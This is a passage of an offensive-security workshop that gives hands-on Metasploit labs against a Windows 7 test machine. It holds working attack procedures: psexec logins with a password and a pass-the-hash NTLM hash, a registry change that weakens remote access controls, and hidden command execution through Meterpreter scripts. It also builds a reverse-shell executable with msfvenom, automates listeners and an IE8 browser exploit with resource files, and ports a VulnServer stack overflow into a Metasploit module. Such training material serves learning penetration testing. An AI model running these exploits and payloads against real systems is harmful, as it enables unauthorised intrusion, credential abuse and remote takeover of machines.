Now we can run the PSEXEC exploit.
-- Option 1:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass password
 
set RHOST CHANGEME-TO-YOUR-WIN7-IP
 
set payload windows/meterpreter/reverse_tcp
 
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP
 
set LPORT 2345
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST CHANGEME-TO-YOUR-WIN7-IP                      
 
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP
 
set LPORT 5678
 
exploit


#####################
# Fix broken PSExec #
#####################
- We use the shell command to get to the Victim Dos command so we can add a registry field.
 
meterpreter > execute -c -H -f cmd -a "/k" -i
reg /?
 
 
- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
 
C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1



###########################################
# Chapter 3: Custom Meterpreter Scripting #
###########################################


- In this lab we will be looking at how you can use some custom Meterpreter scripts to do more than what Metasploit 

can offer.  This will also show you the flexibility of the Meterpreter scripts.
 
- We're going to start off with a simple Hello World script first.  
 
   
echo 'print_status("Hello World")' > /home/infosecaddicts/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
- This next portion is up to you, exploit your test box and end up with a Meterpreter shell.
 
- Lets test out our helloworld.rb Meterpreter script.
 
 
meterpreter> run helloworld
 
 
- So far so good, now we can build on this base.  Lets add a couple more API calls to the script.
 
- Open /home/infosecaddicts/toolz/metasploit/scripts/meterpreter/helloworld.rb in your favorite and add following 

line.
vi /home/infosecaddicts/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
print_error("this is an error!")
print_line("this is a line")
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- Now that we have the basics down, we're going to do something a little more exciting.  
- The architecture to follow when creating these scripts goes as follows:
 
def getinfo(session)
        begin
        	<stuff goes here>
        rescue ::Exception => e
        	<stuff goes here>
        end
end


- Copy and paste the following code into our helloworld.rb script:
 
def getinfo(session)
    begin
       sysnfo = session.sys.config.sysinfo
       runpriv = session.sys.config.getuid
       print_status("Getting system information ...")
       print_status("The target machine OS is #{sysnfo['OS']}")
       print_status("The computer name is #{'Computer'} ")
       print_status("Script running as #{runpriv}")
    rescue ::Exception => e
      print_error("The following error was encountered #{e}")
   end
end
 
getinfo(client)
 
 
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- We can expand it by adding actual system commands to the script, lets look at how we can do this.
 
 
def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
commands = [ "set",
    "ipconfig  /all",
    "arp -a"]
 
list_exec(client,commands)
 
 
 
- Run the script:
 
meterpreter> run helloworld
  



- Alright, now let's have some fun. I want you to take as many commands as you can from winenum.rb (https://github.com/rapid7/metasploit-framework/blob/master/scripts/meterpreter/winenum.rb) and put them into this helloworld.rb script. 



################################################
# Chapter 4: Writing Meterpreter Resource Files #
################################################


- In this lab we are going to create a binary payload via msfpayload then craft a .rc file that automates the 
process to setup the multi handler listener.
 
- We will start off by creating the msfvenom

sudo /sbin/iptables -F
	infosecaddicts

cd ~/toolz/metasploit
 
./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=CHANGEME-TO-YOUR-UBUNTU-IP -f exe > /home/infosecaddicts/Desktop/meterpreter.exe
 
sudo chmod 777 /home/infosecaddicts/Desktop/meterpreter.exe
 
- In the syntax above, we set the payload, set the local host address to connect back too, then redirected the 
malicious payload to our desktop by issuing the correct path. We will also change the permissions on it to 777 just 
to make it easy for us to use WinSCP to copy it over to our Win7 machine.
 
- Next we are going to create a .rc (resource file) file that will automate the process for setting up a listener.
 
- Navigate to the /home/infosecaddicts/toolz/metasploit/ so that when you create the .rc file you can save it in the 
working directory.
 
 
- Type 'touch meterpreter.rc' to create the file.
touch meterpreter.rc
 
- Type 'echo use exploit/multi/handler  >> meterpreter.rc' to be appended to the .rc file.
echo use exploit/multi/handler  >> meterpreter.rc
 
- Type 'echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc' to be appended to the .rc file.
echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc
 
- Type 'echo set LHOST CHANGEME-TO-YOUR-UBUNTU-IP>> meterpreter.rc' to be appended to the .rc file.
echo set LHOST CHANGEME-TO-YOUR-UBUNTU-IP>> meterpreter.rc
 
- Type 'echo exploit -j -z >> meterpreter.rc' to be appended to the .rc file.
echo exploit -j -z >> meterpreter.rc
 
- Then cat the meterpreter.rc out to verify that everything in the file looks ok.
cat meterpreter.rc
 
Now at the command prompt, type 'sudo ./msfconsole -r meterpreter.rc' to start the msfconsole module and call/run 

the 'meterpreter.rc' file.
./msfconsole -r meterpreter.rc
 
- Once the msfconsole starts, the meterpreter resource file is executed and the listener is automatically setup.  It is now listening for a connection!
 
- Now you must transfer the malicious meterpreter payload to the victim machine (you may do so by any means necessary, we have physical access so we transferred it via usb.
 
- Click on the payload and create the meterpreter session.
 
- Type 'sessions -l' to list your open sessions, and 'sessions -i 1' to indicate that you want to interact with 

meterpreter session under id 1.
 
exit -y
    	



***********************************
* Getting Serious About .rc files *
***********************************


touch /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
 
echo run getcountermeasure >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
 
echo run winenum >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_applications >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_logged_on_users >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/checkvm >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
 
 
 
- Ok, that was fun. Now let's take a quick look at the .rc file we just created.
cat /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
 
 
 
 
touch /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
 
 
echo use exploit/windows/browser/ie_cgenericelement_uaf >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
 
echo set ExitOnSession true >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
 
echo set URIPATH /ie8 >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
 
echo set PAYLOAD windows/meterpreter/reverse_tcp >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
 
echo set LHOST CHANGEME-TO-YOUR-UBUNTU-IP >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc                            

            
 
echo set AutoRunScript multi_console_command -rc /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
 
echo exploit -j -z >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
 
 
 
- Ok, that was more fun than the previous one. Now let's take a quick look at the .rc file we just created.
cat /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc

cat /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc 
 
- Alright, enough already. Let's run this thing.
./msfconsole -r old-faithful-ie8.rc

##################################
# Section 4: Exploit Development #
##################################

###############################################
# Chapter 9: Porting an exploit to Metasploit #
###############################################

***********************************************
* Vulnerable Server Versus Fuzzer and Company *
***********************************************


- Inside of your Windows7 VM - download the following file to the Desktop:
https://s3.amazonaws.com/infosecaddicts-Files/SimpleExploitLab.zip
 
- Extract this zip file to your Desktop
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
 
- Open a new command prompt and type:
nc localhost 9999
 
- In the new command prompt window where you ran nc type:
HELP
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts
- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
 
- Now double-click on 1-simplefuzzer.py
- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
 
 
- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed 

on.
 
- Now go to folder C:\Users\Workshop\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and 

attach to process vulnserv.exe
 
- Go back to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
 
- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
 
- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
 
- Calculate the distance to EIP by running script 3-3000chars.py
- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
 
4-count-chars-to-EIP.py
- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
 
5-2006char-eip-check.py
- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP 

with 42424242
 
6-jmp-esp.py
- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
 
7-first-exploit
- In this script we actually do the stack overflow and launch a bind shell on port 4444
 
8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into 

the host.
 
 
------------------------------
 
cd /home/infosecaddicts/toolz/metasploit/modules/exploits/windows/misc
 
vi vulnserv.rb
 
 
 
cd ~/toolz/metasploit
 
./msfconsole
 
 
 
use exploit/windows/misc/vulnserv
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST CHANGEME-TO-YOUR-WIN7-IP
set RPORT 9999
exploit